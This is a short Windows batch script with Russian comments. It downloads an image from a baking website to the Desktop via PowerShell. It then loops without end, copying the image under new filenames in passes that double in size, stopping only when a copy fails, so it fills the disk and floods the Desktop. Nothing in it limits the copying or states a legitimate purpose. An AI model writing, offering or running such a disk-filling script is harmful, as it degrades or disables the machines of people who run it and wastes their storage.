@echo off
setlocal enabledelayedexpansion

set "desktop=%USERPROFILE%\Desktop"
set "filename=3bfbfc477bfe5eed2e33a942b5d5e068.png"
set "source=%desktop%\%filename%"

:: Скачивание изображения
powershell -Command "Invoke-WebRequest -Uri 'https://baking-academy.ru/upload/resize_cache/iblock/3bf/720_1060_1/3bfbfc477bfe5eed2e33a942b5d5e068.png' -OutFile '%source%'"

:: Инициализация
set i=1

:loop
set j=1
:inner
set "newfile=%desktop%\!i!_!j!_%filename%"
copy /Y "%source%" "!newfile!" >nul
if errorlevel 1 exit /b
set /a j+=1
if !j! LEQ !i! goto inner

set /a i*=2
goto loop
